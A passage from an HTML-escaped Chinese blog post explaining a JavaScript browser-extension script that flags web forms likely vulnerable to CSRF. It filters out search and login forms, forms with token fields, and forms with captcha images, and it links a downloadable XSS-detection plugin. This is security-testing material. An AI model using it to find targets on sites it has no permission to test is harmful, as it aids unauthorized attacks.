class=&quot;keyword&quot;&gt;continue&lt;/span&gt; outerFor;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;程序不复杂，复杂的思路。所以这里看起来代码其实也了没多少，而且相当的简单。所以这里就不对代码进行阐述了。&lt;/p&gt;
&lt;h4 id=&quot;0x05-去除带有验证码的form表单：&quot;&gt;&lt;a href=&quot;#0x05-去除带有验证码的form表单：&quot; class=&quot;headerlink&quot; title=&quot;0x05 去除带有验证码的form表单：&quot;&gt;&lt;/a&gt;0x05 去除带有验证码的form表单：&lt;/h4&gt;&lt;hr&gt;
&lt;p&gt;有了之前写自动化检测XSS项目的经验，这里思路就清晰多了。获取img的src属性里的值，判断后缀是否为图片格式。代码如下：&lt;br&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(formDom.find(&lt;span class=&quot;string&quot;&gt;&quot;img&quot;&lt;/span&gt;).length &amp;gt; &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; imageCheck;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;(&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; z = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;z &amp;lt; formDom.find(&lt;span class=&quot;string&quot;&gt;&quot;img&quot;&lt;/span&gt;).length;z++)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; img = formDom.find(&lt;span class=&quot;string&quot;&gt;&quot;img&quot;&lt;/span&gt;).eq(z);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; imgSrc = img.attr(&lt;span class=&quot;string&quot;&gt;&quot;src&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(!!imgSrc)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(imgSrc.indexOf(&lt;span class=&quot;string&quot;&gt;&quot;?&quot;&lt;/span&gt;) != &lt;span class=&quot;string&quot;&gt;&quot;-1&quot;&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                imgSrc = imgSrc.slice(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;,imgSrc.indexOf(&lt;span class=&quot;string&quot;&gt;&quot;?&quot;&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            imgSrc = imgSrc.substr(imgSrc.lastIndexOf(&lt;span class=&quot;string&quot;&gt;&quot;.&quot;&lt;/span&gt;),imgSrc.length);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            imageCheck = imageFileSuffix.some(&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;item,index&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; (imgSrc == item);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(!imageCheck)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;continue&lt;/span&gt; outerFor;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;首先使用&lt;code&gt;formDom.find(&amp;quot;img&amp;quot;).length&lt;/code&gt;来判断当前的form表单里是否存在图片，如果存在，那么if判断会返回true。进入if判断里面后，首先是一个变量，而这个变量是存放some函数返回的布尔结果的。&lt;/p&gt;
&lt;p&gt;然后就是一个for循环，对当前form表单里的img表单进行遍历。而变量&lt;code&gt;img&lt;/code&gt;代表了当前的img标签。而imgSrc变量代表了当前img标签里的src。&lt;/p&gt;
&lt;p&gt;下面是一段if代码&lt;code&gt;if(!!imgSrc)&lt;/code&gt;为什么要这样写呢，是强制把imgSrc变量转成布尔型的，如果当前这个img标签是不存在src属性或没有值的情况下，将会返回false，如果存在src且有值的情况下会返回true。&lt;/p&gt;
&lt;p&gt;而下面的代码的是为了剔除&lt;code&gt;?&lt;/code&gt;后面的字符串：&lt;br&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(imgSrc.indexOf(&lt;span class=&quot;string&quot;&gt;&quot;?&quot;&lt;/span&gt;) != &lt;span class=&quot;string&quot;&gt;&quot;-1&quot;&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    imgSrc = imgSrc.slice(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;,imgSrc.indexOf(&lt;span class=&quot;string&quot;&gt;&quot;?&quot;&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;为什么要写这样的代码呢？原因很简单，未来防止验证码图片被浏览器缓存，需要再后面跟上问号和随机数字，来达到每刷新一次，就会重新请求这个图片。防止浏览器缓存图片。&lt;/p&gt;
&lt;p&gt;而&lt;code&gt;imgSrc = imgSrc.substr(imgSrc.lastIndexOf(&amp;quot;.&amp;quot;),imgSrc.length);&lt;/code&gt;这段代码是剔除，除了后缀之外所有的字符串。只保留后缀。举个例子，有段img标签是这样写的：&lt;br&gt;&lt;code&gt;&amp;lt;img src=&amp;quot;https://wwww.baidu.com/code.php?rand=458711541&amp;quot;&amp;gt;&lt;/code&gt;，而运行上面的代码后，结果只有&lt;code&gt;.php&lt;/code&gt;了，剩下的字符串已经被剔除掉了。&lt;/p&gt;
&lt;p&gt;而下面的some函数，和之前是一样的，不做阐述。只是if里面的表达式里多了一个&lt;code&gt;!取反&lt;/code&gt;感叹号。为什么要这样写呢。因为之前的都是黑名单的形式，而这里的白名单的形式，既然是相反的，那么就使用&lt;code&gt;!取反&lt;/code&gt;就行了。&lt;/p&gt;
&lt;h4 id=&quot;0x06-其他：&quot;&gt;&lt;a href=&quot;#0x06-其他：&quot; class=&quot;headerlink&quot; title=&quot;0x06 其他：&quot;&gt;&lt;/a&gt;0x06 其他：&lt;/h4&gt;&lt;p&gt;整套代码如下：&lt;br&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;60&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;outerFor:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;(&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; i = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;i &amp;lt; $(&lt;span class=&quot;string&quot;&gt;&quot;form&quot;&lt;/span&gt;).length;i++)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; formDom = $(&lt;span class=&quot;string&quot;&gt;&quot;form&quot;&lt;/span&gt;).eq(i);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; imageFileSuffix = [&lt;span class=&quot;string&quot;&gt;&#39;.jpg&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;.png&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;.jpge&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;.ico&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;.gif&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;.bmp&#39;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; placeholderFilterKeyword = [&lt;span class=&quot;string&quot;&gt;&#39;跳&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;搜&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;查&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;找&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;登陆&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;注册&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;search&#39;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; actionFilterKeyword = [&lt;span class=&quot;string&quot;&gt;&#39;search&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;find&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;login&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;reg&#39;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;//去除类似搜索、页面跳转等无用的form表单&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(formDom.attr(&lt;span class=&quot;string&quot;&gt;&quot;action&quot;&lt;/span&gt;) != &lt;span class=&quot;literal&quot;&gt;undefined&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; actionCheck = actionFilterKeyword.some(&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;item,index&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; (formDom.attr(&lt;span class=&quot;string&quot;&gt;&quot;action&quot;&lt;/span&gt;).toLowerCase().indexOf(item)  != &lt;span class=&quot;string&quot;&gt;&quot;-1&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(actionCheck)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;continue&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;(&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; x = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;x &amp;lt; formDom.find(&lt;span class=&quot;string&quot;&gt;&quot;:text&quot;&lt;/span&gt;).length;x++)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; inputTextCheck;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; inputText =  formDom.find(&lt;span class=&quot;string&quot;&gt;&quot;:text&quot;&lt;/span&gt;).eq(x);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(inputText.attr(&lt;span class=&quot;string&quot;&gt;&quot;placeholder&quot;&lt;/span&gt;) == &lt;span class=&quot;literal&quot;&gt;undefined&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;continue&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        inputTextCheck = placeholderFilterKeyword.some(&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;item,index&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; (inputText.attr(&lt;span class=&quot;string&quot;&gt;&quot;placeholder&quot;&lt;/span&gt;).toLowerCase().indexOf(item)  != &lt;span class=&quot;string&quot;&gt;&quot;-1&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(inputTextCheck)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;continue&lt;/span&gt; outerFor;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;//去除没有提交按钮的form表单&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(formDom.find(&lt;span class=&quot;string&quot;&gt;&quot;:submit&quot;&lt;/span&gt;).length &amp;lt; &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;continue&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;//去除具有token的form表单&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;(&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; j = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;j &amp;lt; formDom.find(&lt;span class=&quot;string&quot;&gt;&quot;:hidden&quot;&lt;/span&gt;).length;j++)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(formDom.find(&lt;span class=&quot;string&quot;&gt;&quot;:hidden&quot;&lt;/span&gt;).eq(j).val().length &amp;gt; &lt;span class=&quot;number&quot;&gt;10&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;continue&lt;/span&gt; outerFor;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;//去除带有验证码的form表单&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(formDom.find(&lt;span class=&quot;string&quot;&gt;&quot;img&quot;&lt;/span&gt;).length &amp;gt; &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; imageCheck;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;(&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; z = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;z &amp;lt; formDom.find(&lt;span class=&quot;string&quot;&gt;&quot;img&quot;&lt;/span&gt;).length;z++)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; img = formDom.find(&lt;span class=&quot;string&quot;&gt;&quot;img&quot;&lt;/span&gt;).eq(z);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; imgSrc = img.attr(&lt;span class=&quot;string&quot;&gt;&quot;src&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(!!imgSrc)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(imgSrc.indexOf(&lt;span class=&quot;string&quot;&gt;&quot;?&quot;&lt;/span&gt;) != &lt;span class=&quot;string&quot;&gt;&quot;-1&quot;&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    imgSrc = imgSrc.slice(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;,imgSrc.indexOf(&lt;span class=&quot;string&quot;&gt;&quot;?&quot;&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                imgSrc = imgSrc.substr(imgSrc.lastIndexOf(&lt;span class=&quot;string&quot;&gt;&quot;.&quot;&lt;/span&gt;),imgSrc.length);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                imageCheck = imageFileSuffix.some(&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;item,index&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; (imgSrc == item);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;#125;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(!imageCheck)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    &lt;span class=&quot;keyword&quot;&gt;continue&lt;/span&gt; outerFor;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;built_in&quot;&gt;console&lt;/span&gt;.log(formDom)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;这里的console.log(formDom)可以改为ajax等方式发包，或者alert直接提醒此页面可能具有csrf漏洞。至于如何使用，需要大伙手工打包成浏览器插件的形式。而这里我为大家附上我之前写的自动化检测XSS的插件：&lt;a href=&quot;http://pan.baidu.com/s/1ge5VTcf&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://pan.baidu.com/s/1ge5VTcf&lt;/a&gt;。大家可以直接解包，修改里面的JavaScript代码为上面完整的代码，再重新打包就行了。&lt;/p&gt;
&lt;p&gt;文章呢，还有很多地方不足。而这套程序还只能说是雏形，所以我没有附上直接利用的工具给大家，也是第一次这样。而且有很多地方没有考虑到，比如JSON Hijacking检测。当然下一章会完成的，也会放出可以直接利用的工具。第二章或者第三章可能会把之前写的XSS自动化检测与本章所说的自动化检测CSRF相结合起来。毕竟XSS+CSRF的危害是非常大的。&lt;/p&gt;
&lt;hr&gt;
